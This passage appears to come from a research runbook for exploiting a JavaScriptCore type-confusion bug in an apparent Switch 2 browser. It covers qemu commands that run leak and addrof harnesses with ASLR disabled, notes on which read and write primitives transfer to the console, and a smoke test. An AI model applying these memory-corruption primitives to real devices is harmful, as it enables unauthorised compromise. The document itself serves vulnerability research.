cd /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/oss/vm/groom
ROOT=/tmp/opencode/jscroot; JSC=$ROOT/usr/local/bin/jsc; ulimit -c 0
printf 'CALIB' > /tmp/opencode/leak-mode
printf '0000000000000000' > /tmp/opencode/leak-ptr
addr=$(setarch $(uname -m) -R qemu-aarch64 -L $ROOT $JSC \
        --useJIT=false --useDollarVM=1 --useConcurrentGC=false leak.js \
        | head -1 | sed -E 's/.*<(0x[0-9a-f]+),.*/\1/')
printf 'PROOF' > /tmp/opencode/leak-mode
printf '%016x' $addr > /tmp/opencode/leak-ptr
setarch $(uname -m) -R qemu-aarch64 -L $ROOT $JSC \
        --useJIT=false --useDollarVM=1 --useConcurrentGC=false leak.js
```

`setarch $(uname -m) -R` disables ASLR (host `randomize_va_space` is 2 here);
`-R` is required for `leak.js` because it takes an absolute address from a file.
Editing `leak.js` changes the heap layout and therefore the calibrated address.

### 6.4 Where results were recorded — and what is missing

**Present:**

* `oss/vm/groom/RESULTS.md` — the A/B/C/E/F/G/K table, exit codes ×3, fault
  registers, the gdb mechanism dump, the `leak.js` readback, the `$vm` notes.
* `oss/vm/groom/ASLR.md` — channels 1–4 with per-run tables (maps constants
  3/3, proof 3/3 + 5/5, gigacage 3 runs, channel 3 safe/bogus, channel 4).
* `oss/vm/crash-backtrace.txt`, `crash-reentrancy-raw.txt`,
  `crash-backtrace-gdbstub.txt`, `crash-backtrace-gdbstub-jitoff.txt`.
* `/tmp/opencode/runs.log`, `/tmp/opencode/final-runs.log` — raw
  `=== file runN rc=NNN ===` transcripts for the groom suite.
* `/tmp/opencode/async-read/last-*.log`, `new-*.log` — the 5-run concurrent vs
  serial matrix (§4.4) per-run transcripts, plus `run-matrix.sh`.
* `ns2jb-webkit/runs/attempt-sweep.json` — the **console** ladder state
  (`index`, `phase`, `history[]`), not a VM artifact.
* `ns2jb-webkit/runs/webkit-*/report.jsonl` — console sessions, e.g.
  `webkit-YPHITc` (48 `addrof-read-async` progress events, 44 rows).

**Missing:**

* `sweep-results.json` — the `sweep.sh` output. **No copy from the original
  session exists**: nothing in the repository (`find . -name
  'sweep-results.json'` is empty) and the running container has no `/out`
  (`ls: cannot access '/out'`). The sweep was run (the ladder is described in
  `RESULTS.md` and `EXPLOITATION-REPORT.md` §8) but the JSON was not preserved.
  Re-running §6.1 reproduces it; the fresh run on 2026-10-26 left
  `/tmp/opencode/sweep-out2/sweep-results.json` (summary in §6.1).
* `matrix.json` — **does not exist and was never written.** `run-matrix.sh`
  only printed `RESULT mode=… family=… survive=n/5 copied=n/5` to stdout and
  wrote `last-<mode>-<family>-<i>.log`; §4.4 is derived from those logs.
* `ns2jsc-dbg` image and the first attempts of the fixed build (canceled,
  §2.4).

---

## 7. Known pitfalls

### 7.1 JIT must be off

`--useJIT=false` on every invocation. With JIT on, qemu-user 11.1.2 dies in
`LinkBuffer::copyCompactAndLinkCode` → libc SME `cpyfp` during `VM::VM`
(`oss/vm/crash-backtrace-gdbstub.txt`). Symptom: a SIGSEGV before the first
line of the script, including for `jsc --version`. This also explains the
220 MB core baked into the image. Two places where this bites silently:

* `sweep.sh` never passes the flag (§6.1) — every attempt then measures the
  artifact;
* the `jsc --version` probe at the top of `sweep.sh` prints
  `ERROR: invalid option: --version` plus a qemu SIGSEGV line before the first
  attempt. That is the artifact, not a result.

### 7.2 qemu SIMD artifacts

The emulator's NEON lowering shows up in the traces and can change behaviour:

* `resolveRopeInternalNoSubstring` uses `ldp q0,q1,[x0]` / `uzp1 v0.16b,…` /
  `str q0,[x2],#16`. When the confused length points at unmapped memory the
  fault is on the `ldp`, at `+360` — always report the offset, not just the
  symbol.
* `uzp1` is the 16-bit→8-bit narrowing path. It is selected by
  `data[16] & 0x4` of the fake `StringImpl` (`m_hashAndFlags`); that is why the
  groom harnesses use `'D'` (0x44) filler instead of `'A'` (0x41) — with `'A'`
  every other leaked byte is dropped (`RESULTS.md`, `leak.js` header).
* Do not read qemu's own SIMD faults as evidence about the bug.

### 7.3 Release has no symbols

`ns2jsc`'s `jsc` is not stripped (51584 symbols) but has no DWARF: `bt` gives
`JSC::ErrorInstance::computeErrorInfo(JSC::VM&) ()` with no line, no arguments,
no locals. Breakpoints on mangled/demangled names work. For line-level work you
need `ns2jsc-dbg` (§2.5, §5.4), which does not exist yet.

### 7.4 Concurrent GC changes determinism

Default (concurrent) GC makes the re-entrant collection land wherever timing
puts it: in the §4.4 matrix the first read copied 2/5 with the default and 5/5
with `--useConcurrentGC=false`. A run that ends in `exit=139` at `read-begin`
or with `copied:false` is usually this race, not a primitive failure —
`oss/WRITE-HUNT.md` §1.4 says the same for the console. Use
`--useConcurrentGC=false` for comparable results and retry killed attempts.

### 7.5 Console vs VM divergence — what transferred

The VM is **pristine upstream JSCOnly** with bmalloc and Gigacage. The console
target is the NetFront/WKC fork
(`oss/ns2-23/NS2_23.0.0/webkit_3.12.11/`), which differs in ways that invalidate
address-level results:

| difference | VM | console fork |
|---|---|---|
| Gigacage | enabled (`GIGACAGE_ENABLED 0` only under `USE(SYSTEM_MALLOC)`, `oss/vm/src/Source/WTF/wtf/Gigacage.h:31`) | `#if USE(SYSTEM_MALLOC) \|\| PLATFORM(WKC)` → `GIGACAGE_ENABLED 0` (`WTF/wtf/Gigacage.h:31-32`) |
| allocator | bmalloc + caged butterflies | WKC allocator, no cage |
| asserts | release build, `ASSERT` compiled out | release build; `ASSERT(isSymbol())` does not fire either (`oss/LEAK-HUNT.md` §2.1) |
| shell aids | `$vm` with `--useDollarVM=1`, `readFile`, `load`, `/proc/self/maps` | none of these in a page |

**Transferred:**

* `addrof` via the `536ac3a29fc` GetterSetter→Symbol confusion
  (`oss/LEAK-HUNT.md` §2). It is the documented starting capability on console,
  "confirmed on console (`ns2jb-webkit/runs/webkit-YPHITc`)"
  (`oss/WRITE-HUNT.md`, opening).
* The self-bootstrapping read: `addrof-read-async` leaks the marker address and
  then reads at that same address in the same page load, so it needs no maps
  file. Console `webkit-YPHITc` shows `leakAddress` / `readAddress`
  `0x276263be00` and `0x4e11bc3e00` with `copied:true` in 5 rows. This is the
  read history that transferred.
* The rope primitive itself (header-controlled length/pointer) is the same code
  in the fork; `oss/WRITE-HUNT.md` §1.5 ranks it 9/10 on fork source checks.

**Did not transfer:**

* The `/proc/self/maps` address derivation (`groom/aslr-selfcal.js`, channel 1)
  — a page has no `/proc`; `ASLR.md` "Console recommendation" says nothing
  transfers unchanged and the page must obtain mapping information by other
  means.
* Gigacage constants and any absolute VM address: the VM cage base is
  randomised every run (`ASLR.md` channel 2) and the console has no cage at
  all, so cage offsets are meaningless there.
* The `$vm`-based calibration (`$vm.dumpCell`, `$vm.gc`, `$vm.value`) — absent
  on console, and there is no `$vm.address`/`$vm.addrof` even in the VM
  (`RESULTS.md`, `$vm` section).
* The fake-`SymbolImpl` refcount write: observed as `+2` in the VM
  (`refcount-write.js`, `WRITE-HUNT.md` §2.2) but its verification needs a
  collector, and a collector that visits the retyped cell crashes — the console
  family records `structureVerification:"collector-required"` and never
  confirms it.
* Address-shaped observations generally: console addresses are 0x27…/0x4e…
  (WKC allocator) while the VM's are 0x7f…; never copy a number between them.

### 7.6 Cores, disk, and stale state

* Forgetting `ulimit -c 0` litters the CWD with 220–722 MB cores; 24 exist in
  this repository (8.5 GB) and one is inside the image.
* Heap layout is script-sensitive: `leak.js` calibrates an address that is only
  valid for the *same file at the same path* with ASLR off.
* `docker ps -a | grep ns2jsc` shows leftovers from the original session (an
  exited `ns2gdb` container and a container still running `timeout 120 jsc …`).
  They hold no state you need; the exported rootfs is the durable copy.

### 7.7 Small but sharp

* `jsc` has no `--version`; use `jsc -e 'print(1+1)'`.
* `runFamily` returns a Promise; a bare `JSON.stringify(...)` prints `{}`.
* Shell arguments need `--` (`jsc script.js -- name`).
* `$vm` requires `--useDollarVM=1`; `typeof $vm` is `undefined` otherwise.
* The synchronous `prototype-gettersetter-addrof` family dies at
  `object-conversion` in this VM (§4.2); `addrof-proto-steps` survives and is
  the right "did the ladder work" probe.

---

## 8. Verify — smoke test

Five checks, in order. Everything below was run on 2026-10-26 and produced
exactly these results.

```sh
ROOT=/tmp/opencode/jscroot
JSC=$ROOT/usr/local/bin/jsc
ulimit -c 0
```

### 8.1 Engine runs

```sh
qemu-aarch64 -L $ROOT $JSC --useJIT=false -e 'print(1+1)'
```

Expected: `2`, exit 0, ~0.13 s.

### 8.2 The repro crashes

```sh
qemu-aarch64 -L $ROOT $JSC --useJIT=false \
  /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25/oss/vm/error-instance.js
echo "exit=$?"
```

Expected:

```
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
exit=139
```

### 8.3 The ladder reaches the leak without the confused read

```sh
qemu-aarch64 -L $ROOT $JSC --useJIT=false --useDollarVM=1 --useConcurrentGC=false \
  /tmp/opencode/vm-run-family.js -- addrof-proto-steps
echo "exit=$?"
```

Expected: `exit=0`, four `STEP` lines ending at `STEP object-conversion`, and a
`ROW` with `"prototypeType":"object"`. No crash — this proves the addrof ladder
works in the VM even when the description read is not attempted.

### 8.4 One family leak

```sh
qemu-aarch64 -L $ROOT $JSC --useJIT=false --useDollarVM=1 --useConcurrentGC=false \
  /tmp/opencode/vm-run-family.js -- addrof-read-async
echo "exit=$?"
```

Expected: `exit=0`, steps up to `STEP read-second leak=0x…`, and a `ROW` with

* `"leakAddress"` = `"readAddress"` (a raw pointer, 0x7f… here, ending
  `…4040`/`…c060` depending on which marker object wins),
* `"copied":true` and a 128-hex-char `copyHex` beginning with a structure word
  and zeros, e.g. `b3030000001800000000000000000000a083415e8e7f0000…`,
* `"secondCopied":true`.

If it exits 139 or prints `"copied":false`, that is the GC race — re-run.

### 8.5 The fixed control does not crash

```sh
cd /home/maci/Desktop/Research/switch2-ns2jb-2026-10-25
docker run --rm --platform linux/arm64 --ulimit core=0 \
  -v "$PWD/oss/vm:/work:ro" ns2jsc-fixed \
  sh -c 'ulimit -c 0; jsc --useJIT=false /work/error-instance.js; echo rc=$?'
```

Expected: no output from `jsc`, `rc=0`. The same command with `ns2jsc` prints
`Segmentation fault (core dumped)` and `rc=139`.

All five passing means the image, the exported rootfs, the qemu invocation, the
bug, the family harness and the patched control are all in the state this
document describes.
